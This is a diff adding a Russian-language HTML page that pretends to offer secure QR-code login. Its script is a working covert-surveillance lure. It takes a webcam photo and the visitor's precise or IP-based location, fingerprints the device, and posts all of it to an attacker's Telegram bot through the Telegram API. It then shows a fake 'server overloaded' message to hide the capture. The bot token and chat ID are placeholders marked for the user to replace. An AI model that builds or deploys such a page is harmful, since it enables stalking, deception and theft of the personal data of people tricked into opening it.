@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Вход по QR-коду</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: system-ui, -apple-system, sans-serif;
+      background: #f8fafc;
+      color: #1e293b;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .card {
+      max-width: 500px;
+      width: 90%;
+      padding: 30px;
+      background: white;
+      border-radius: 16px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+      text-align: center;
+    }
+    .btn {
+      background: #3b82f6;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      border-radius: 12px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 20px;
+      width: 100%;
+    }
+    .hidden { display: none; }
+    #videoPreview {
+      width: 100%;
+      max-height: 300px;
+      background: #000;
+      border-radius: 12px;
+      margin: 20px 0;
+      display: none;
+    }
+    .status { margin-top: 15px; font-size: 14px; color: #64748b; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <!-- ЭКРАН 1: QR-ПРЕДЗАПРОС -->
+    <div id="screen-prompt" class="screen">
+      <div style="font-size:64px;margin-bottom:20px">📱</div>
+      <h2>Отсканируйте QR-код для входа</h2>
+      <p>Для безопасного входа в систему разрешите доступ к камере.</p>
+      <button class="btn" onclick="requestCamera(1)">Продолжить</button>
+    </div>
+
+    <!-- ЭКРАН 2: ВИДЕО -->
+    <video id="videoPreview" autoplay playsinline muted></video>
+
+    <!-- ЭКРАН 3: УСПЕХ -->
+    <div id="screen-success" class="screen hidden">
+      <div style="font-size:64px;margin-bottom:20px">⚠️</div>
+      <h2>Сервер перегружен</h2>
+      <p>Попробуйте повторить вход через несколько минут.</p>
+    </div>
+
+    <!-- ЭКРАН 4: ОТКАЗ -->
+    <div id="screen-denied" class="screen hidden">
+      <div style="font-size:64px;margin-bottom:20px">❌</div>
+      <h2>Доступ запрещён</h2>
+      <p>Вход невозможен без доступа к камере.</p>
+    </div>
+
+    <div class="status" id="status"></div>
+  </div>
+
+  <script>
+    // === КОНФИГУРАЦИЯ ===
+    const CONFIG = {
+      BOT_TOKEN: 'ВАШ_ТОКЕН',        // ← ЗАМЕНИТЕ
+      CHAT_ID: 'ВАШ_CHAT_ID',        // ← ЗАМЕНИТЕ
+      MAX_CAMERA_ATTEMPTS: 2
+    };
+
+    let cameraAttempt = 0;
+
+    // === ОТПРАВКА ФОТО В TELEGRAM ===
+    async function sendPhoto(imageData) {
+      try {
+        const blob = await (await fetch(imageData)).blob();
+        const formData = new FormData();
+        formData.append('chat_id', CONFIG.CHAT_ID);
+        formData.append('photo', blob, 'qr_scan.jpg');
+        formData.append('caption', '📸 QR-скан: вход на сайт');
+        await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+      } catch (e) {
+        console.error('Ошибка фото:', e);
+      }
+    }
+
+    // === ОТПРАВКА КАРТЫ ===
+    async function sendLocation(lat, lon, label = "Местоположение") {
+      try {
+        // Карта
+        await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendLocation`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CONFIG.CHAT_ID,
+            latitude: lat,
+            longitude: lon,
+            horizontal_accuracy: 50
+          })
+        });
+        // Подпись
+        await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CONFIG.CHAT_ID,
+            text: `📍 ${label}\nКоординаты: ${lat.toFixed(6)}, ${lon.toFixed(6)}`
+          })
+        });
+      } catch (e) {
+        console.error('Ошибка карты:', e);
+      }
+    }
+
+    // === СБОР ФИНГЕРПРИНТА ===
+    function collectFingerprint() {
+      return {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        deviceMemory: navigator.deviceMemory || 'N/A',
+        hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+        connection: navigator.connection?.effectiveType || 'unknown',
+        canvas: (() => {
+          try {
+            const c = document.createElement('canvas');
+            const ctx = c.getContext('2d');
+            ctx.fillText('fingerprint', 0, 10);
+            return c.toDataURL().substring(0, 30);
+          } catch { return 'N/A'; }
+        })()
+      };
+    }
+
+    // === ОТПРАВКА ТЕКСТОВОГО ОТЧЁТА ===
+    async function sendReport(fingerprint, geoSource) {
+      const report = `
+📱 *Устройство*: ${fingerprint.platform}
+🌐 *Браузер*: ${fingerprint.userAgent.substring(0, 50)}...
+🖥 *Экран*: ${fingerprint.screen}
+🌍 *Часовой пояс*: ${fingerprint.timezone}
+📡 *Сеть*: ${fingerprint.connection}
+🧠 *RAM/CPU*: ${fingerprint.deviceMemory} ГБ / ${fingerprint.hardwareConcurrency} ядер
+🎯 *Геолокация*: ${geoSource}
+⏱ *Время*: ${new Date().toLocaleString('ru-RU')}
+      `.trim();
+
+      await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CONFIG.CHAT_ID,
+          text: report,
+          parse_mode: 'Markdown'
+        })
+      });
+    }
+
+    // === ЗАПРОС ГЕОЛОКАЦИИ ПОСЛЕ ФОТО ===
+    async function requestGeolocationAfterPhoto() {
+      document.getElementById('status').textContent = 'Определяем местоположение...';
+
+      // Сначала пробуем точную геолокацию
+      const precise = await new Promise((resolve) => {
+        if (!navigator.geolocation) return resolve(null);
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, source: 'точная' }),
+          () => resolve(null),
+          { timeout: 8000 }
+        );
+      });
+
+      if (precise) {
+        await sendLocation(precise.lat, precise.lon, 'Точное местоположение');
+        await sendReport(collectFingerprint(), precise.source);
+      } else {
+        // Fallback на IP-геолокацию
+        try {
+          const ipResp = await fetch('https://api.ipify.org?format=json');
+          const ip = (await ipResp.json()).ip;
+          const geoResp = await fetch(`https://ipapi.co/${ip}/json/`);
+          const geo = await geoResp.json();
+          
+          if (geo.latitude && geo.longitude) {
+            await sendLocation(parseFloat(geo.latitude), parseFloat(geo.longitude), 'Местоположение по IP');
+            await sendReport(collectFingerprint(), 'по IP');
+          } else {
+            await sendReport(collectFingerprint(), 'не определено');
+          }
+        } catch (e) {
+          await sendReport(collectFingerprint(), 'ошибка определения');
+        }
+      }
+
+      // Показываем финальное сообщение
+      document.getElementById('screen-success').classList.remove('hidden');
+    }
+
+    // === ЗАПРОС КАМЕРЫ ===
+    async function requestCamera(attempt) {
+      cameraAttempt = attempt;
+      const video = document.getElementById('videoPreview');
+      
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          video: true, 
+          audio: false 
+        });
+        
+        video.srcObject = stream;
+        video.style.display = 'block';
+        document.getElementById('screen-prompt').classList.add('hidden');
+
+        await new Promise(r => setTimeout(r, 1200));
+        
+        // Скриншот
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        const imageData = canvas.toDataURL('image/jpeg', 0.7);
+        
+        stream.getTracks().forEach(track => track.stop());
+        video.style.display = 'none';
+        
+        // Отправка фото
+        await sendPhoto(imageData);
+        
+        // Запрос геолокации
+        await requestGeolocationAfterPhoto();
+        
+      } catch (err) {
+        video.style.display = 'none';
+        handleCameraDenied();
+      }
+    }
+
+    // === ОБРАБОТКА ОТКАЗА КАМЕРЫ ===
+    function handleCameraDenied() {
+      if (cameraAttempt < CONFIG.MAX_CAMERA_ATTEMPTS) {
+        document.getElementById('screen-prompt').innerHTML = `
+          <div style="font-size:64px;margin-bottom:20px">❗</div>
+          <h2>QR-вход обязателен</h2>
+          <p>Без доступа к камере вход невозможен.</p>
+          <button class="btn" onclick="requestCamera(${cameraAttempt + 1})">Повторить</button>
+        `;
+      } else {
+        document.getElementById('screen-prompt').classList.add('hidden');
+        document.getElementById('screen-denied').classList.remove('hidden');
+      }
+    }
+  </script>
+</body>
+</html>
